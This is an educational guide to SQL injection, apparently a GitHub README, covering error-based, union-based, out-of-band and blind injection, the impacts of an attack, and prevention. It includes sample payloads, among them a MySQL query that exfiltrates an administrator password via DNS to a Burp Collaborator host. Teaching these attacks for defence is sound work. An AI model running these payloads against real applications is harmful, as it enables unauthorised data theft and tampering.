# Table of Contents
- [Definition](#definition)
- [Prerequisites](#prerequisites)
- [Types of SQLi](#types-of-sqli)
   * [In-band SQLi](#in-band-sqli)
   * [Error based](#error-based)
   * [Union-based](#union-based)
   * [Out-of-band SQLi](#out-of-band-sqli)
   * [Inferential SQLi (Blind SQLi)](#inferential-sqli-blind-sqli)
   * [Boolean-based](#boolean-based)
   * [Time-based](#time-based)
   * [Simple SQL Injection Example](#simple-sql-injection-example)
- [Impact of SQL Injection Attacks](#impact-of-sql-injection-attacks)
- [How to Prevent Injection](#how-to-prevent-injection)

# Definition
SQL injection is malicious SQL queries by exploiting application vulnerabilities. Additionally, SQL injection is a code injection technique that can be getting important information from your database. SQLi can go as far as destroying your database. The following things could be done with SQLi:

- An SQL Injection vulnerability could allow the attacker to gain full access to the database server.
- SQL injection also could allow changing the data in the database. For instance, an attacker could use SQL Injection to change balances or transfer money to their account in a financial application.
- SQLi can be used to delete records and deleting data can affect application accessibility until the database is restored.
- An operating system can be accessed using a database server on some database servers.

# Prerequisites
An application is vulnerable if:

- The data provided by the user is not verified, filtered, or sterilized by the application.
- Dynamic queries or non-parameterized functions executed with no context-sensitive escaping are used straight in the interpreter.
- Dangerous data is used in the object-relational mapping (ORM) search parameters to get valuable, important records.

The basis of a code injection vulnerability is the lack of validation and sanitization of the data used by the web application. This vulnerability could be existing on almost any type of technology related to websites. Anything that accepts parameters as input can potentially be vulnerable to an injection attack.

# Types of SQLi
We can classify SQL injection types based on the methods they use to access backend data and their damage potential.

![image](https://github.com/user-attachments/assets/e1ccf8b7-56e5-4170-b9ca-ce7d2579acb4)

## In-band SQLi
In-band SQL Injection occurs when an attacker can use the same communication channel to launch the attack and gather results.

## Error based
Error-based injections give insight into the database. These errors can be helpful to developers and network administrators but must be restricted on the application side.

Example: If the server responds to this URL with an SQL error, it shows the server has connected to the database in an insecure way. After this step, some of the SQL commands can be run to tamper or destroy the database.

```https://www.example.com/category.php?id=2'```

## Union-based
It is a type of injection that combines the results of two or more ```SELECT``` statements into a single result using the ```UNION``` operator to get more information from the database.

Example: The below example shows an attacker can get the number of columns using this type of injection attack.

```https://example.com/category.php?id=3 'UNION+SELECT+NULL,NULL,NULL--```

## Out-of-band SQLi
Out-of-band SQL injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. The database server can send data to an attacker with the ability to make DNS or HTTP requests.

![image](https://github.com/user-attachments/assets/251b917b-35db-41ab-8923-544104ce28d4)

Suppose that the application’s response does not depend on whether the query returns any data, or whether a database error occurs, or the time taken to execute the query. We can trigger out-of-band network interactions for this application that we control. These can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. Moreover, various network protocols can be used to leak data from network interactions.

The visual here shows that the query was sent to the application’s database via the web application. At that time, the listening server on the network captures information of some DNS and HTTP interactions of database out band requests. We can use Burp Collaborator while using out-of-band techniques. Burp Collaborator allows you to detect when network interactions occur because of sending individual payloads to a vulnerable application and lists the DNS, HTTP Protocols interactions. Burp Collaborator is built into Burp Suite. The techniques for triggering a DNS query are highly specific to the type of database being used. For example, the query used in the next example triggers the target MySQL database.

Example: DNS Based Exfiltration

```SELECT+password+FROM+users+WHERE+username%3d'administrator INTO OUTFILE '\\\\ qwqdu0hle7fue507e75dfaenler4ft.burpcollaborator.net\a'```

![image](https://github.com/user-attachments/assets/ec0fd689-8342-4d47-9154-5270a5451bc0)

OOB SQL injection data could exfiltration from an outbound channel using DNS or HTTP protocol. In this example, the DNS protocol was used, and the Burp Collaborator server is used to listening and capturing outbound requests initiated from the database system. This query was created thinking of the target database is MySQL. This query reads the password for the Administrator user, appends a Collaborator subdomain, and triggers a DNS lookup. The DNS lookup result will be like the following, we could see the password that belongs to the administrator.

The following items may cause to use OOB injection:

- Lack of input validation in web applications.
- Target database in a network environment that allows sending outgoing requests (DNS, HTTP) without security restrictions.
- Sufficient privileges to initiate an outbound request.

The following methods can be used to prevent OOB SQLi:

- Input validation for client and server-side.
- Proper error handling to avoid displaying detailed error information.
- Review network and security architecture design.
- Assigning the database account based on the least privilege principle.
- Implementation of Web Application Firewall (WAF) and Intrusion Prevention System (IPS) for security control.
- Continuous monitoring for anomaly and proper incident response processes as the safety net of the controls.

## Inferential SQLi (Blind SQLi)
In the Inferential SQLi attack, the attacker cannot see the results because the web application database is not transmitting the data. For this reason, the attacker sends queries and tries to build the structure of the database by observing the web application’s response and the behavior of the database.

## Boolean-based
This technique forces different responses to get from the application, depending on whether the query returns correct or incorrect results by sending queries to the database.

Example: As in the first query, we can estimate the length of the database with Boolean expressions based on the answers returned from the database. And of course, we can even find out its name by furthering a query like this. With a query like in the second example, we can ensure that all items in the x category are displayed from the database.

```
http://www.example.com/?id=1' AND (length(database())) = 8 — +

http://example.com/categoryx.php?id=1 OR 17–7=10
```

## Time-based
This technique forces the database to wait for a while before responding after the query is submitted.

Example: With this technique, we can query whether the user is a system admin from the returned response time using a time-based query with a conditional query as in the first example. Or we can determine that the database type is MySQL from the slowness of the response time returned by using an example such as the second query and a query such as if the database version is equal to MYSQL 5.

```
SELECT * FROM products WHERE id=1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:15'

SELECT * FROM card WHERE id=1-IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0)
```

## Simple SQL Injection Example
SQL injection usually occurs when you ask a user for input, like their username/user ID, and instead of a name/id, the user gives you an SQL statement that you will unknowingly run on your database.

Look at the following example which creates a SELECT statement by adding a variable (txtUserId) to a select string. The variable is fetched from user input (getRequestString):

![image](https://github.com/user-attachments/assets/b0fb409a-4571-4cc3-82ac-7c0615ecad36)

# Impact of SQL Injection Attacks

![image](https://github.com/user-attachments/assets/50762ee2-64ba-45f4-9875-e1c09bcb82f2)

The attacker injects a malicious query into the web application’s vulnerable entry point. The form, HTTP header, or session ID could be vulnerable. So, the attacker can use these security vulnerabilities. For instance, the web application could be commercial, financial, related to banking, etc. In this way, the attacker could access confidential information related to the content of the web application.

Assume that the web application is related to banking and the attacker is the administrator. In this case, the attacker can access the customer account information from the bank database with a malicious query. This can cause critical damage to a bank.

If the attack is successful, the following situations can occur:

- Stealing credentials: SQL injections can be used to obtain users’ credentials. Attackers can access their privileges then pose as these users.
- Accessing database: Attackers can use SQL injections to reach information stored in a database server.
- Altering data: Attackers can use SQL injections to modify or destroy the accessed database.
- Accessing networks: Attackers can use SQL injections to access database servers with operating system privileges. Then, the attacker can try to access the network.

# How to Prevent Injection
SQL Injection vulnerabilities can be prohibited with special prevention techniques according to the subtype of SQLi vulnerability, SQL database engine, and programming language. However, the general principles you can follow to keep your web application secure are as follows:

Primary Defenses:

- Option 1: Using Prepared Statements
- Option 2: Using Stored Procedures
- Option 3: Using Whitelist for Inputs
- Option 4: Not Using User Inputs

Additional Defenses:

- Option 1: Using Least Privilege
- Option 2: Performing Whitelist Input Validation








